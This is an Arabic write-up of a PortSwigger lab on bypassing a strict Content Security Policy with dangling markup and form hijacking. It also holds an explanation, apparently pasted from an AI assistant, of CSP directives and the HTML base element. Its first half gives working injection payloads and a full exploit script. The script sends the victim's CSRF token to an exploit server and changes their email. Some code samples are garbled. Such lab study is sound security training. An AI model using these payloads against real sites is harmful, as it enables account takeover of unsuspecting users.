# Lab : Reflected XSS protected by very strict CSP , with dangling markup attack

https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack

- الفكره من الLab ده ان الموقع عنده حمايه عاليه من CSP و المفروض احصل علي CSRFالخاص ب الشخص الي بيتصفح الموقع او الtarget و اغير الemail بتاعه ل `hacker@evil-user.net`  واعمل زرار عليه click me او مضغط عليه الexpliot يحصل .

```bash
1. اول حاجه هعملها اهشوف هل الموقع مصاب ولا لا هجرب في خانه الemail علشان ده المتاح عندي واشوف هيعرض ولا لا 

2. my-account?id=wiener&email=<img src onerror=alert(1)>

3. value الحقن بيحصل في خانت ال CSP هو عرض في خانت الميل الكود ده بس متنفزش علشان 

4. لو بصينا علي ترتيب الكود هنلاقي الكلام الي حقناه في الترتيب قبل الelement الي جواه الCSRF الي بندور عليه عند التارجت فا هنحاول نخرج من السياق ونشوف لو نعرف نتلاعب او نعمل حقن للHTML كود علشان نخليه يعرضه 

5. في الاول هنجرب نحقن الكود ده ونشوف :

6. "><img src="https://www.google.com/someimage">

7. مشهيحصل اي حاجه هيظهر الكود بس من غير ميظهر صوره او يستدعي الموقع كل ده بسبب مشاكل الCSP مامنه كل حاجه في الطبيعي الوامر التلقائيه احسن من اليدويه بس غالبا دي الطريقه الوحيده لتخطي الحمايه اعمل زرار اول ما الضحيه يضغط عليه يحوله للموقع الي انا عاوزه الكود هو :

8. "><a href="https://google.com">Click Me </a

9. وفعلي حولني علي google اول مضغط علي الزر بس مبيسربش معلومات حساسه هنحاول نعدل ونخليه يسرب معلومات حساسه

10. هنستخدم element اسمه base في نوعين من الروابط روابط موجود عنوانها كامل وروابط الاسم بس دي بتحتاج الbase علشان تفتح اي عنوان في الرابط ده بعده علي طول 

11. في خاصيه تانيه نعاها اسمها target="_blank"a  بتفتح اي رابط في تبويب جديد هنجرب الكود ده :

12. "><a href='https://www.any.com"> Click me </a><base target="abdo" 

13. بعد اما عملناه حولنا علي الصفحه الي احنا خترناها في تبويب جديد تب اذاي اظهر الCSRF المخفيه حاجه بسيطه :

14. "><a href='https://www.any.com"> Click me </a><base target="abdo 

15. هنشيل ال" الي في الاخر فا dungle code هيفتكر ان كل الي في الframe معاه ومين الي تحته الCSRF المخفيه فا هيظهرها علشان اعرض الحجات الي ختها من الكود هروح علي الconsole واكتب window.name;a 
```

```bash
///////////////// الي فوق شرح الي تحت حل ///////////////////////

1. https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>

2.ده علشان يظهر الCSRF 

3. ده حل الاب وبيعمل كل حاجه :

4. <body>
<script>
// Define the URLs for the lab environment and the exploit server.
const academyFrontend = "https://your-lab-url.net/";
const exploitServer = "https://your-exploit-server.net/exploit";

// Extract the CSRF token from the URL.
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.
if (csrf) {
    // If a CSRF token is present, create dynamic form elements to perform the attack.
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
    token.name = 'csrf';
    token.value = csrf;

    // Configure the new email address intended to replace the user's current email.
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    // Set the form attributes, append the form to the document, and configure it to automatically submit.
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();

    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

اللاب ده من PortSwigger بيتكلم عن **CSP Bypass + Form Hijacking**، والفكرة الأساسية هي فهم كيف يمكن لـ **Content Security Policy (CSP)** أن تمنع تحميل الموارد الخارجية، وكيف يمكن أن تبقى هناك طرق لإساءة استخدام النماذج إذا كانت السياسة غير مكتملة. بما أنه تدريب داخل بيئة PortSwigger المصرح بها، أقدر أشرح الفكرة والمنهجية، لكن ليس إعطاء خطوات استغلال جاهزة أو حمولة (payload) تؤدي إلى حل اللاب مباشرة.

### أولًا: ما معنى وصف اللاب؟

> **This lab uses a strict CSP that prevents the browser from loading subresources from external domains.**
> 

يعني الموقع عامل CSP تمنع:

- `<script src="https://evil.com/x.js">`
- `<img src="https://evil.com/x.png">`
- `<iframe src="https://evil.com">`

أي تحميل لموارد خارجية هيترفض.

لكن لاحظ كلمة **subresources**.

هذا لا يعني بالضرورة أن كل أنواع الطلبات الخارجية ممنوعة.

### المطلوب

> Perform a form hijacking attack
> 

يعني بدل ما النموذج (form) يرسل البيانات للموقع الأصلي:

```
POST /my-account/change-email
```

أنت تريد تجعل النموذج يرسل البيانات إلى مكان آخر.

### بعد كده

> Exfiltrates the simulated victim user's CSRF token
> 

يعني لازم توصل لقيمة الـ CSRF Token الخاصة بالضحية.

غالبًا ستكون داخل:

```html
<input
type="hidden"
name="csrf"
value="abc123">
```

المطلوب أن تخرج هذه القيمة خارج الصفحة بطريقة لا تمنعها الـ CSP.

### وبعدها

> Uses it to authorize changing the email
> 

بعد الحصول على الـ token تستخدمه في الطلب الحقيقي لتغيير الإيميل إلى:

```
hacker@evil-user.net
```

## طيب الـ CSP بتمنع الموارد الخارجية، أعمل إيه؟

هنا لازم تقرأ الـ CSP.

مثلاً افتح Response Headers وابحث عن:

```
Content-Security-Policy:
```

قد تجد شيئًا مثل:

```
default-src 'self';
script-src 'self';
img-src 'self';
```

أو

```
form-action
```

أو

```
connect-src
```

هذه هي التي تحدد أين تكمن الثغرة.

## أهم نقطة في اللاب

اسأل نفسك:

هل الـ CSP تمنع:

```
script-src
```

ولا تمنع أيضًا:

```
form-action
```

إذا لم يوجد:

```
form-action
```

فهذه غالبًا هي الفكرة.

## لماذا؟

لأن:

```
script-src
```

لا تتحكم في إرسال الـ forms.

بينما:

```
form-action
```

هي التي تمنع إرسال النماذج إلى دومينات أخرى.

## إذًا ماذا أبحث؟

داخل صفحة الـ exploit في PortSwigger ابحث عن إمكانية:

- تعديل `action` الخاص بالنموذج.
- إنشاء نموذج جديد.
- إجبار المستخدم على الضغط عليه (ولهذا قالوا ضع كلمة "Click").

## لماذا كلمة Click؟

لأن الضحية سيضغط على الرابط أو الزر المكتوب عليه:

```
Click
```

فيبدأ تنفيذ الـ exploit.

## كيف تحل اللاب بشكل عام؟

1. افتح الصفحة.
2. اقرأ الـ CSP.
3. اعرف ما الذي تمنعه وما الذي لا تمنعه.
4. لاحظ أين يوجد CSRF token.
5. فكّر هل يمكن إرسال النموذج إلى وجهة مختلفة رغم وجود CSP.
6. بعد الحصول على الـ token، استخدمه في الطلب الشرعي لتغيير البريد.

## ماذا تتعلم من هذا اللاب؟

أن وجود CSP لا يعني أن الموقع آمن بالكامل.

إذا نسي المطور إضافة:

```
form-action
```

فيمكن أحيانًا إساءة استخدام النماذج حتى مع منع تحميل السكربتات والموارد الخارجية.

إذا أرسلت لي:

- عنوان اللاب (مثل: **CSP bypass with form hijacking**)، أو
- قيمة **Content-Security-Policy** الموجودة في الـ Response Headers،

أشرح لك فكرة هذا اللاب بالتحديد وما الذي ينبغي ملاحظته للوصول إلى الحل بنفسك، دون إعطائك الحل الجاهز.

# ما هو `<base>`؟

العنصر `<base>` يخبر المتصفح:

> **"اعتبر هذا هو العنوان الأساسي (Base URL) لأي رابط نسبي داخل الصفحة."**
> 

أي أنه بدل أن يبدأ المتصفح من عنوان الصفحة الحالية، يبدأ من العنوان الذي كتبته داخل `href`.

مكانه دائمًا داخل `<head>`:

```
<head><basehref="https://example.com/"></head>
```

# أولاً: ما الفرق بين الرابط النسبي والرابط المطلق؟

## رابط مطلق (Absolute URL)

```
<ahref="https://google.com">Google</a>
```

هذا رابط كامل.

المتصفح يعرف مكانه مباشرة.

**`<base>` لا يؤثر عليه إطلاقًا.**

## رابط نسبي (Relative URL)

```
<ahref="about.html">About</a>
```

هنا لا يوجد دومين.

المتصفح يحتاج أن يعرف:

> أين توجد `about.html`؟
> 

في الحالة العادية، سيعتبرها موجودة بجانب الصفحة الحالية.

# بدون `<base>`

لنفترض أن الصفحة الحالية هي

```
https://mywebsite.com/pages/index.html
```

وكتبت

```
<ahref="about.html">
```

المتصفح سيذهب إلى

```
https://mywebsite.com/pages/about.html
```

لأنه اعتبر الصفحة الحالية هي المرجع.

# مع `<base>`

الآن أضف

```
<head><basehref="https://mywebsite.com/files/"></head>
```

ثم اكتب

```
<ahref="about.html">
```

المتصفح لن ينظر إلى مكان الصفحة الحالية.

بل سيقول:

> المرجع الأساسي أصبح
> 

```
https://mywebsite.com/files/
```

إذن الرابط النهائي يصبح

```
https://mywebsite.com/files/about.html
```
